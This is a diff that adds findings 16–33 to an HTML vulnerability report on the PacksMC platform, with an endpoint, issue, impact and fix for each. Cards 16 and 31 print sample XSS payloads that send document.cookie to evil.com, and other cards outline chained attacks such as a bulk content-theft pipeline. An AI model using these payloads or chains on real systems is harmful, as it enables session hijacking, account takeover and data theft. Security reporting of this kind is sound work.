@@ -697,17 +697,576 @@
       </div>
     </div>
 
+    <div class="section-divider">
+      <span>Additional Critical Findings</span>
+    </div>
+
+    <!-- Bug 16 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">16</div>
+        <div class="bug-title">Blind Stored XSS in Report Forms — Admin Session Hijack</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">Report Pack / Report User forms (<code>POST /api/reports</code>)</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">"Additional details" text fields in report forms accept <strong>unsanitized input</strong>.
+          Reports are rendered on the internal admin dashboard without proper HTML escaping. Attacker submits a report
+          containing JavaScript payload (e.g., <code>&lt;img src=x onerror=fetch('evil.com/steal?c='+document.cookie)&gt;</code>).
+          The XSS fires silently when an admin views the report.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Blind XSS executes in admin session context</strong> → full admin account
+          takeover, data exfiltration, privilege escalation to platform-wide control. Zero interaction required from
+          admin beyond viewing the report.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Strict server-side sanitization (DOMPurify). Render all user-submitted reports as
+          plain text in admin panel. Add <code>Content-Security-Policy</code> headers.</div>
+      </div>
+    </div>
+
+    <!-- Bug 17 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">17</div>
+        <div class="bug-title">Unauthenticated File Upload — ZIP Slip / Zip Bomb (NO AUTH)</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>/converter</code>, <code>/designer</code>, <code>/viewer</code> — 3 public pages</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Three public pages accept file uploads (ZIP and PNG, up to 50MB) <strong>without
+            requiring any authentication</strong>. No server-side validation of archive contents, entry paths, or
+          uncompressed size. Any anonymous visitor can upload files.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>ZIP Slip</strong> (path traversal → overwrite server files → RCE),
+          <strong>Zip Bomb</strong> (42.zip → petabytes uncompressed → DoS), <strong>malicious PNG</strong> (image
+          processing library RCE). All exploitable by anonymous users with zero authentication.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Require authentication before upload. Validate all ZIP entries — reject paths
+          containing <code>..</code>. Cap uncompressed size + file count. Sandbox processing. Rate-limit per IP.</div>
+      </div>
+    </div>
+
+    <!-- Bug 18 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">18</div>
+        <div class="bug-title">No CSRF Protection — Cross-Site Account Action Forgery</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">All <code>POST</code>/<code>PUT</code>/<code>DELETE</code> endpoints (pack upload,
+          settings, reports, profile changes)</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">No CSRF tokens present on <strong>any</strong> forms or API calls.
+          <code>SameSite</code> cookie attribute not strictly enforced. State-changing operations accept cross-origin
+          requests without verification.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Attacker crafts malicious page → victim visits → auto-submits requests on victim's
+          behalf → <strong>modify account settings, upload malicious packs, delete content, change linked
+            accounts</strong> — all without victim's knowledge or consent.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Implement CSRF tokens on all state-changing endpoints. Set
+          <code>SameSite=Strict</code> on session cookies. Use double-submit cookie pattern.</div>
+      </div>
+    </div>
+
+    <!-- Bug 19 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">19</div>
+        <div class="bug-title">Session Token Contains Decodable User PII (JWT Payload)</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">All authenticated sessions —
+          <code>__Secure-better-auth.session_token</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Better Auth session token is a <strong>base64-encoded JWT</strong> whose payload
+          contains user email, display name, internal UUID, and account role in <strong>plaintext</strong>. Any party
+          with access to the cookie value (XSS, network interception, browser extension) can decode and extract full PII
+          without needing server-side access.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Chain with XSS (#16) → steal session cookie → base64 decode JWT → extract
+          <strong>real email, name, UUID, role</strong>. Full de-anonymization + account impersonation for every
+          logged-in user.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Use opaque session tokens (random strings) instead of JWTs. Store session data
+          server-side only. Ensure <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite=Strict</code> flags on
+          all auth cookies.</div>
+      </div>
+    </div>
+
+    <!-- Bug 20 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">20</div>
+        <div class="bug-title">MinIO Bucket CORS Wildcard — Cross-Origin Data Theft</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>https://minio.packsmc.com/</code> — CORS configuration</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">MinIO bucket configured with <code>Access-Control-Allow-Origin: *</code>, permitting
+          <strong>any website</strong> to make cross-origin requests to the bucket via JavaScript
+          <code>fetch()</code>/<code>XMLHttpRequest</code>. No origin validation.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Attacker hosts <code>evil.com</code> → JavaScript fetches MinIO bucket listing +
+          downloads all files via victim's browser. Combined with #1 (public listing), enables
+          <strong>complete storage exfiltration from any origin</strong>. Admin JARs, user banners, pack assets — all
+          stealable via a single malicious page.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Restrict CORS to <code>packsmc.com</code> domains only. Remove wildcard
+          <code>*</code> origin. Validate <code>Origin</code> header server-side. Set
+          <code>Access-Control-Allow-Credentials: false</code>.</div>
+      </div>
+    </div>
+
+    <!-- Bug 21 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">21</div>
+        <div class="bug-title">Client-Side Only Upload Validation — Complete Server-Side Bypass</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>/upload</code>, <code>/converter</code>, <code>/designer</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">File type (<code>.zip</code> extension) and size (50MB) validation enforced
+          <strong>only in React frontend JS</strong>. No server-side validation of MIME type, magic bytes, or actual
+          file size. Direct API requests via <code>curl</code> or Burp Suite bypass all checks entirely.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Upload <strong>any file type</strong> (HTML, SVG with embedded JS, PHP, EXE) of
+          <strong>any size</strong> to the server. Stored XSS via HTML/SVG files served from trusted CDN domain.
+          Potential webshell upload. Disk exhaustion DoS.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Server-side validation of MIME types + magic bytes. Whitelist allowed extensions.
+          Re-validate file size. Set <code>Content-Disposition: attachment</code> on all downloads. Reject all
+          non-conforming uploads.</div>
+      </div>
+    </div>
+
+    <!-- Bug 22 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">22</div>
+        <div class="bug-title">Zero Rate Limiting on All Public API Endpoints</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>/api/packs</code>, <code>/api/user/*</code>, <code>/api/search</code>,
+          <code>/api/announcements/*</code>, <code>/api/communities/*</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value"><strong>No observable rate limiting</strong> on any public API endpoint. Automated
+          tools can fire unlimited requests per second without throttling, blocking, CAPTCHA, or IP ban. Tested: 100+
+          rapid requests returned 200 OK with full data.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Enables <strong>every data exfiltration bug to be exploited at maximum
+            speed</strong>. Combined with #2 (mass dump) + #8 (search enum) → complete database theft in seconds.
+          Resource exhaustion, bandwidth abuse, automated scraping at scale.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Per-IP and per-user rate limiting. Recommended: 60 req/min public, 120 req/min
+          authenticated. Exponential backoff. <code>429 Too Many Requests</code> response with
+          <code>Retry-After</code> header.</div>
+      </div>
+    </div>
+
+    <!-- Bug 23 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">23</div>
+        <div class="bug-title">No Registration Rate Limiting — Automated Bot Account Farming</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">OAuth registration flow — <code>/auth/sign-in</code> +
+          <code>/auth/callback</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value"><strong>No rate limiting, CAPTCHA, or bot detection</strong> on account registration.
+          Automated scripts can create unlimited accounts using disposable OAuth tokens or automated browser sessions.
+          No device fingerprinting or behavioral analysis.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Bot army creation</strong> → weaponize bots to inflate view/download counts
+          (#25), submit mass fake reports to overwhelm moderation, upload plagiarized/malicious packs, and
+          <strong>manipulate platform rankings to distribute malware</strong>.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">CAPTCHA on registration. Rate-limit new accounts per IP (max 3/hour). Device
+          fingerprinting + behavioral analysis. Flag accounts with suspicious registration patterns.</div>
+      </div>
+    </div>
+
+    <!-- Bug 24 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">24</div>
+        <div class="bug-title">Google OAuth Avatar URLs Expose Real User Identities</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>GET /api/user/{username}</code> → <code>avatar_url</code> field</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Returns raw Google avatar URL
+          (<code>lh3.googleusercontent.com/a/ACg8oc...</code>) containing the user's <strong>Google profile picture
+            identifier</strong>. This directly links to the user's real Google account and profile.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Cross-platform de-anonymization</strong> — map PacksMC username → Google
+          account → real name, email, other linked services. Enables targeted doxxing and social engineering.
+          Affects <strong>ALL users who registered via Google OAuth</strong>.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Proxy and cache avatar images on PacksMC CDN. Strip Google identifiers from URLs.
+          Allow custom avatar uploads not linked to OAuth providers.</div>
+      </div>
+    </div>
+
+    <!-- Bug 25 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">25</div>
+        <div class="bug-title">Download/View Counter Inflation — Fake Popularity Manipulation</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">Direct download URLs from <code>direct_url</code> + pack view tracking endpoints</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Download and view counters <strong>increment on every HTTP request</strong> without
+          authentication, rate limiting, or IP/user deduplication. Static CDN URLs accept unlimited requests. A single
+          script can inflate any pack's stats by thousands in minutes.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Manipulate "Most Popular" and "Trending" rankings</strong> → push
+          malicious/plagiarized packs to top visibility → distribute malware to unsuspecting users. Legitimate creators
+          lose ranking to inflated competitors. Platform integrity destroyed.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Require authenticated downloads. Use signed, single-use, time-limited URLs.
+          Deduplicate views per user/IP. Anomaly detection for sudden stat spikes.</div>
+      </div>
+    </div>
+
+    <!-- Bug 26 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">26</div>
+        <div class="bug-title">No Rate Limiting on Login — Brute Force & Credential Stuffing</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>/auth/sign-in</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">No CAPTCHA, progressive delay, or account lockout after <strong>multiple failed login
+            attempts</strong>. Unlimited rapid authentication attempts allowed from the same IP. No failed attempt
+          logging or alerting.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Brute-force attacks</strong> against common passwords.
+          <strong>Credential stuffing</strong> with leaked databases (RockYou, Collection #1-5) at scale.
+          Automated mass account takeover affecting all users with weak or reused passwords.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">CAPTCHA after 3-5 failures. Temporary lockout (15-30 min). Progressive delay between
+          attempts. Alert on brute-force patterns. Implement <code>Account Lockout Policy</code>.</div>
+      </div>
+    </div>
+
+    <!-- Bug 27 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">27</div>
+        <div class="bug-title">Email Bombing via Password Reset — Domain Blacklist Risk</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>POST /api/auth/forgot-password</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value"><strong>No rate limiting</strong> on password reset requests. Attacker can trigger
+          thousands of reset emails to any target email address in minutes. No CAPTCHA, no cooldown, no per-email
+          request cap.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Victim's inbox flooded → important emails lost. <strong>PacksMC domain may be
+            blacklisted by email providers</strong> (Gmail, Outlook, Yahoo) → ALL users stop receiving emails
+          (verification, reset, notifications). Service-wide availability impact.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Rate limit to 3 requests per email per hour. Add CAPTCHA verification on reset form.
+          Implement exponential backoff. Monitor and alert on mass reset patterns.</div>
+      </div>
+    </div>
+
+    <!-- Bug 28 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">28</div>
+        <div class="bug-title">Admin Panel at Predictable <code>/admin</code> Route</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>/admin</code> — also listed in <code>robots.txt</code> as
+          <code>Disallow: /admin/</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Admin panel exists at the <strong>default predictable path</strong>
+          <code>/admin</code>. Protected only by standard auth redirect. Additionally, <code>robots.txt</code>
+          explicitly lists <code>Disallow: /admin/</code>, <strong>confirming its existence</strong> to any attacker who
+          checks.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">Reduces attack complexity to zero for admin discovery. If <strong>any</strong> auth
+          bypass, session hijack (#16 + #19), or privilege escalation is found → <strong>immediate full admin
+            access</strong>. Single point of failure for entire platform.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Move admin panel to unpredictable path. IP whitelist or VPN-only access. Mandatory 2FA
+          for admin sessions. Remove <code>/admin/</code> from <code>robots.txt</code>.</div>
+      </div>
+    </div>
+
+    <!-- Bug 29 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">29</div>
+        <div class="bug-title">OAuth-Only Authentication — Zero Recovery Path</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>/auth/sign-in</code>, Security settings page</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Authentication relies <strong>solely on Google/Discord OAuth</strong>. No local
+          password option. No alternative recovery mechanism. No independent 2FA. Users have <strong>zero way to
+            recover</strong> their account if they lose OAuth provider access.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">If Google/Discord has outage → <strong>ALL users locked out</strong>. If user loses
+          OAuth account → permanently locked out of PacksMC + all packs. Single OAuth provider compromise =
+          total auth system compromise for every user on that provider.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Offer local password alongside OAuth. Independent 2FA (TOTP/WebAuthn). Recovery codes.
+          Emergency access procedure via email verification.</div>
+      </div>
+    </div>
+
+    <!-- Bug 30 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">30</div>
+        <div class="bug-title">Complete Platform Theft Pipeline — All Critical Bugs Chained</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">All previously mentioned endpoints — combined automated exploitation</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Critical bugs chain into a <strong>fully automated attack pipeline</strong>:<br>
+          1. Mass dump all pack IDs + metadata (#2)<br>
+          2. Extract direct CDN download URLs (#14)<br>
+          3. Enumerate all users + profiles (#8)<br>
+          4. Download all preview textures per pack (#6)<br>
+          5. Zero rate limiting enables max-speed execution (#22)<br>
+          6. Bot army provides scale + anonymity (#23)<br>
+          No detection, alerting, or prevention mechanisms exist at any stage.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Complete platform content theft in a single automated session.</strong> ALL
+          2,724 packs, all user data, all premium content downloadable without payment, authentication, or detection.
+          Competitor can clone the entire PacksMC catalog overnight.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Comprehensive API gateway: rate limiting, API keys, request signing, anomaly
+          detection. SIEM monitoring for bulk access patterns. Alert on unusual data volumes. Implement all individual
+          fixes listed above.</div>
+      </div>
+    </div>
+
+
+    <!-- Bug 31 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">31</div>
+        <div class="bug-title">Better Auth Session Token Accessible via JavaScript (Missing <code>HttpOnly</code>)</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">All authenticated pages — cookie <code>__Secure-better-auth.session_token</code></div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">The <code>__Secure-better-auth.session_token</code> cookie is <strong>missing the
+            <code>HttpOnly</code> flag</strong>. This means the session token is fully accessible via
+          <code>document.cookie</code> in JavaScript. Any XSS vulnerability (e.g., #16) can directly read and
+          exfiltrate the session token to an attacker-controlled server.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Instant full account takeover from any XSS.</strong> Attacker steals session
+          token via <code>fetch('https://evil.com/steal?t='+document.cookie)</code> → impersonate victim, access all
+          data, upload malicious packs, modify account. Affects <strong>every logged-in user</strong> who triggers any
+          XSS payload.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Set <code>HttpOnly</code> flag on all authentication cookies in Better Auth config.
+          This prevents JavaScript from accessing the cookie entirely, breaking the XSS → token theft chain. Also set
+          <code>Secure</code> and <code>SameSite=Strict</code>.</div>
+      </div>
+    </div>
+
+    <!-- Bug 32 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">32</div>
+        <div class="bug-title">Google Account ID + OAuth Scopes Leaked via Profile API</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value"><code>GET /api/user/{username}</code> and authentication callback responses</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">User profile API responses expose the user's <strong>raw Google Account ID</strong>
+          (numeric identifier) and the <strong>OAuth permission scopes</strong> granted during registration
+          (<code>email</code>, <code>profile</code>, <code>openid</code>). This data is returned for
+          <strong>any user</strong> without authentication — not just the requesting user's own profile.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value"><strong>Complete real-identity exposure:</strong> Google Account ID → lookup real
+          name, email, profile photo, YouTube channel, Google reviews, and all linked services. OAuth scopes reveal
+          exactly what data PacksMC can access from the user's Google account — enabling targeted <strong>OAuth
+            phishing attacks</strong> that mimic PacksMC's permission requests.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Never expose Google Account ID or OAuth scopes in any public API response. Use internal
+          opaque IDs only. Store OAuth metadata server-side exclusively. Strip all provider-specific identifiers from
+          client-facing responses.</div>
+      </div>
+    </div>
+
+    <!-- Bug 33 -->
+    <div class="bug-card new-bug">
+      <div class="bug-header">
+        <div class="bug-number">33</div>
+        <div class="bug-title">Hotjar Session Recordings on Login/Payment Pages — Credential Capture</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-endpoint">Endpoint</div>
+        <div class="field-value">All pages — Hotjar tracking script active globally including <code>/auth/sign-in</code>,
+          <code>/settings/security</code>, and payment flows</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-issue">Issue</div>
+        <div class="field-value">Hotjar session recording is <strong>active on ALL pages</strong> with no exclusions
+          for sensitive routes. This means Hotjar captures full mouse movements, clicks, scrolls, and potentially
+          <strong>keystrokes on login pages, security settings, and payment forms</strong>. Session replays are stored
+          on Hotjar's infrastructure (third-party).</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-impact">Impact</div>
+        <div class="field-value">If Hotjar is compromised or an employee accesses recordings: <strong>mass credential
+            theft</strong> from login page recordings. Payment card details potentially captured during checkout.
+          Session recordings also expose user browsing patterns, private pack interactions, and admin panel usage.
+          Violates PCI-DSS if payment data is captured.</div>
+      </div>
+      <div class="field">
+        <div class="field-label label-fix">Fix</div>
+        <div class="field-value">Exclude sensitive pages from Hotjar recording: <code>/auth/*</code>,
+          <code>/settings/*</code>, <code>/admin/*</code>, and all payment routes. Use Hotjar's
+          <code>suppress</code> attribute on password/email input fields. Enable Hotjar's built-in PII masking.
+          Audit recording scope for GDPR compliance.</div>
+      </div>
+    </div>
 
 
     <footer>
       <div class="warning-icon">⚠️</div>
-      SalyVn — 33 Critical Bugs Total | <strong>🔥 FIX IMMEDIATELY: #28 (Bot Accounts) + #30 (View Inflation) + #24
-        (Cookie PII) + #25 (MinIO CORS)</strong><br>
-      Worst chain: Bot army (#28) → inflate views/downloads (#30/#33) → manipulate rankings → distribute malware<br>
-      Identity chain: XSS (#17) → cookie PII (#24) → account takeover (#22) | evil.com → MinIO theft (#25)
+      SalyVn — 33 Critical Bugs Total | <strong>🔥 FIX IMMEDIATELY: #31 (Session Token Leak) + #32 (Google ID
+        Exposure) + #23 (Bot Accounts) + #25 (View Inflation)</strong><br>
+      Worst chain: Bot army (#23) → inflate views/downloads (#25/#30) → manipulate rankings → distribute malware<br>
+      Identity chain: XSS (#16) → steal token (#31) → decode PII (#19) → full takeover (#18) | Google ID (#32) → real
+      identity<br>
+      Credential chain: Hotjar recordings (#33) → login page keystrokes → mass credential harvest
     </footer>
 
   </div>
 </body>
 
 </html>
+
